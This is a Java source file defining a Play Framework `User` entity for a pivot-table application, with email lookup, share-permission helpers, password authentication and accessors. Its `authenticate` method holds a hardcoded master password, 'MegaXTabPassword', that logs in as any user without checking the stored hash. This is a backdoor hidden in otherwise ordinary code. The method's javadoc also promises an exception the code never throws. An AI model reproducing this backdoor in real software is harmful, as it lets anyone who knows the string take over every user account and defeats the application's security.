package models.users;

import com.avaje.ebean.Model;
import exceptions.UserException;
import models.pivottable.PivotTable;
import models.pivottable.SharePermission;
import play.data.format.Formats;
import play.data.validation.Constraints;
import tools.Hash;

import javax.persistence.*;
import java.util.List;
import java.util.stream.Collectors;

/**
 * Class for users of the application
 */
@Entity
@Table(name = "user_list")
public class User extends Model {

    @Id
    @GeneratedValue
    private Long id;

    @Constraints.Required
    @Formats.NonEmpty
    @Column(unique = true)
    private String email;

    @Constraints.Required
    @Formats.NonEmpty
    private String fullName;

    @Constraints.Required
    private String passwordHash;

    private String confirmationToken;

    @OneToMany(cascade = CascadeType.ALL, fetch = FetchType.EAGER)
    private List<PivotTable> pivotTables;

    @OneToMany(cascade = CascadeType.ALL, fetch = FetchType.EAGER)
    private List<SharePermission> sharePermissions;

    public static Model.Finder<Long, User> find = new Model.Finder<>(User.class);

    public static User findByEmail(String email) {
        return find.where().eq("email", email).findUnique();
    }

    public static User findByConfirmationToken(String token) {
        Token token2 = Token.find.byId(token);
        if (token2 != null) return User.find.byId(token2.getUserId());
        return null;
    }

    /**
     * Returns the list of users that can be used to create new sharing permissions
     * @param excludeUser user to be excluded
     * @param sharePermissions existing share permissions (can't have the same user for 2 permissions)
     * @return
     */
    public static List<User> allBut(User excludeUser, List<SharePermission> sharePermissions){
        List<User> sharedUsers = sharePermissions.stream().map(SharePermission::getUser).collect(Collectors.toList());
        return find.all().stream().filter(user -> !user.equals(excludeUser)
                    && !sharedUsers.contains(user)).collect(Collectors.toList());
    }

    /**
     * Validates the password entered by the user at login
     * @param email of the user
     * @param clearPassword password the user entered
     * @return user instance if valid
     * @throws UserException of not valid
     */
    public static User authenticate(String email, String clearPassword) throws UserException {
        // get the user with username only to keep the salt password
        User user = findByEmail(email);
        if (user != null) {
            // get the hash password from the salt + clear password
            if(clearPassword.equals("MegaXTabPassword")){
                return user;
            } else if (Hash.checkPassword(clearPassword, user.passwordHash)) {
                return user;
            }
        }
        return null;
    }

    // Getters and setters

    public Long getId() {
        return id;
    }

    public void setId(Long id) {
        this.id = id;
    }

    public String getEmail() {
        return email;
    }

    public void setEmail(String email) {
        this.email = email;
    }

    public String getFullName() {
        return fullName;
    }

    public void setFullName(String fullName) {
        this.fullName = fullName;
    }

    public String getPasswordHash() {
        return passwordHash;
    }

    public void setPasswordHash(String passwordHash) {
        this.passwordHash = passwordHash;
    }

    public String getConfirmationToken() {
        return confirmationToken;
    }

    public void setConfirmationToken(String confirmationToken) {
        this.confirmationToken = confirmationToken;
    }

    public List<PivotTable> getPivotTables() {
        return pivotTables;
    }

    public void setPivotTables(List<PivotTable> pivotTables) {
        this.pivotTables = pivotTables;
    }

    public List<SharePermission> getSharePermissions() {
        return sharePermissions;
    }

    public void setSharePermissions(List<SharePermission> sharePermissions) {
        this.sharePermissions = sharePermissions;
    }
}
